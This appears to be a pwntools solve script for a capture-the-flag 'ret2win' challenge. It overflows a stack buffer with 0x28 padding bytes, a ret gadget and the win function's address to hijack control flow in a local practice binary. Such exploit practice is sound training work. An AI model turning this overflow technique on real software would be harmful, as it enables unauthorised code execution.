#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


exe = ELF('./ret2win')
# host = 'chal.sigpwny.com'
# port = 1337

# libc = ELF('./path/to/libc')
rop = ROP(exe)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe



# Run without randomization
# python3 solve.py GDB NOASLR



def conn(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

WIN = exe.symbols['ret2win']

RET = rop.find_gadget(['ret'])[0]

def solve():
    io = conn()
    io.recvuntil(b'> ')
    
    exploit = b'A' * 0x28 + p64(RET) + p64(WIN)
    
    io.sendline(exploit)

    io.interactive()
    
if __name__ == "__main__":
    solve()

